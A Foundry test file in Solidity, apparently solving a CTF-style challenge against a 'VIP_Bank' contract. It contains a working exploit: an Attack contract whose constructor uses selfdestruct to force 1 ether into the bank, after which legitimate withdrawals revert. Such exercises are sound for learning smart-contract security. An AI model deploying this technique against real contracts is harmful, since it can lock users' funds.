// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "src/vip.sol";

contract Attack {
    constructor(address _addr) payable {
        selfdestruct(payable(_addr));
    }
}

contract VipTest is Test {
    VIP_Bank public bank;
    address manager = makeAddr("manager");
    address user = makeAddr("user");

    function setUp() public {
        vm.startPrank(manager);
        bank = new VIP_Bank();
        bank.addVIP(user);
        vm.stopPrank();
    }

    function test_exploit() public {
        deal(user, 2 ether);

        vm.startPrank(user);

        bank.deposit{value: 0.05 ether}();
        assert(bank.balances(user) == 0.05 ether);

        bank.withdraw(0.05 ether); 

        Attack attack = new Attack{value: 1 ether}(address(bank));

        assert(address(bank).balance == 1 ether);

        bank.deposit{value: 0.05 ether}();
        vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");
        bank.withdraw(0.05 ether); 

        vm.stopPrank();

        console.log("Bank balance after exploit:", bank.contractBalance());
        console.log("User balance after exploit:", user.balance);
    }
}